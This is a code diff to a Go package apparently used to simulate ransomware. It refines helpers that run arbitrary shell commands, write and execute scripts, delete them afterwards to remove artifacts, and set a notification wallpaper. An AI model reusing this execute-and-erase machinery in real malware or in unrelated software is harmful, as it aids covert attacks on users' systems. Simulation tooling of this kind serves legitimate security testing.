@@ -5,13 +5,27 @@ package ransimware
 import (
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 
 	"github.com/mjwhitta/errors"
 )
 
 // ExecuteScript will run shell commands using the provided method, as
-// well as attempt to clean up artificats, if requested.
+// well as attempt to clean up artifacts, if requested. Supported
+// methods include:
+//   - #!bash (will write and run script)
+//   - #!sh (will write and run script)
+//   - #!zsh (will write and run script)
+//   - ash
+//   - bash
+//   - csh
+//   - dash
+//   - ksh
+//   - sh
+//   - shell (same as bash)
+//   - tcsh
+//   - zsh
 func ExecuteScript(
 	method string,
 	clean bool,
@@ -68,6 +82,7 @@ func executeShell(shell string, cmds []string) (string, error) {
 
 	// Run cmds
 	for _, cmd := range cmds {
+		//nolint:gosec // G204 - That's kinda the whole point
 		if o, e = exec.Command(shell, "-c", cmd).Output(); e != nil {
 			e = errors.Newf("command \"%s\" failed: %w", cmd, e)
 			return strings.Join(out, "\n"), e
@@ -85,27 +100,24 @@ func executeShellScript(
 	name string,
 	cmds []string,
 	clean bool,
-) (string, error) {
-	var e error
-	var o []byte
+) (_ string, e error) {
+	var b []byte
 
 	// Create shell script
 	if e = writeScript(name, cmds); e != nil {
 		return "", e
 	}
 
-	// Make script executable
-	if e = os.Chmod(name, os.ModePerm); e != nil {
-		e = errors.Newf("failed to make script executable: %w", e)
-		return "", e
-	}
-
 	// Run shell script
-	o, e = exec.Command(name).Output()
+	b, e = exec.Command(name).Output()
 
 	// Clean up, if requested
 	if clean {
-		os.Remove(name)
+		defer func() {
+			if e == nil {
+				e = os.Remove(name)
+			}
+		}()
 	}
 
 	// Check for error
@@ -113,10 +125,11 @@ func executeShellScript(
 		return "", errors.Newf("command \"%s\" failed: %w", name, e)
 	}
 
-	return strings.TrimSpace(string(o)), nil
+	return strings.TrimSpace(string(b)), nil
 }
 
 // WallpaperNotify is a NotifyFunc that sets the background wallpaper.
+// For any OS other than Windows, this is a no-op.
 func WallpaperNotify(
 	img string,
 	png []byte,
@@ -124,25 +137,22 @@ func WallpaperNotify(
 	clean bool,
 ) NotifyFunc {
 	return func() error {
-		return errors.New("unsupported OS")
+		// return errors.New("unsupported OS")
+		return nil
 	}
 }
 
 func writeScript(name string, cmds []string) error {
-	var e error
-	var f *os.File
+	//nolint:gosec // G302 - Needs to be executable
+	var e error = os.WriteFile(
+		filepath.Clean(name),
+		[]byte(strings.Join(cmds, "\n")),
+		//nolint:mnd // u=rwx,go=-
+		0o700,
+	)
 
-	// Open script
-	if f, e = os.Create(name); e != nil {
-		return errors.Newf("failed to create %s: %w", name, e)
-	}
-	defer f.Close()
-
-	// Write script
-	for _, cmd := range cmds {
-		if _, e = f.WriteString(cmd + "\n"); e != nil {
-			return errors.Newf("failed to write to %s: %w", name, e)
-		}
+	if e != nil {
+		return errors.Newf("failed to write to %s: %w", name, e)
 	}
 
 	return nil
